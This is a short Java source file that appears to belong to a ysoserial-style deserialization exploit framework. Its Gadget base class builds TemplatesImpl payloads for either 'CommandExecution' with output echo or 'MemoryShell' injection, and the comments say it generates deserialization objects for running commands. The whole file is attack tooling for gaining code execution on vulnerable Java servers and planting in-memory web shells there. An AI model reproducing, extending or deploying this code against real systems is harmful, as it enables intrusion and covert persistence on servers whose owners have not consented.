package com.mechoy.gadget.inter;

import com.mechoy.bean.YsoGadgetBean;
import com.mechoy.utils.EncodingUtils;
import com.mechoy.utils.TemplateUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.LoaderClassPath;

public class Gadget {

    protected static boolean CBFlag = true;

    /**
     * 生成用于执行命令的反序列化
     *
     * @param gadgetBean 将构造链需要用的东西封装为一个javaBean
     * @return
     * @throws Exception
     */
    public Object getObject(YsoGadgetBean gadgetBean) throws Exception {
        return new Object();
    }

    public TemplatesImpl generateTemplate(YsoGadgetBean gadgetBean) throws Exception {
        if (gadgetBean.getType().equals("CommandExecution")) {
            // 执行命令的直接入，在TemplateUtils中进行回显分支
            return TemplateUtils.getCommandTemplate(gadgetBean.getCommand(), gadgetBean.getEchoType());
        } else if (gadgetBean.getType().equals("MemoryShell")) {

            return TemplateUtils.getMemShellTemplate(gadgetBean);
        }
        return null;
    }
}
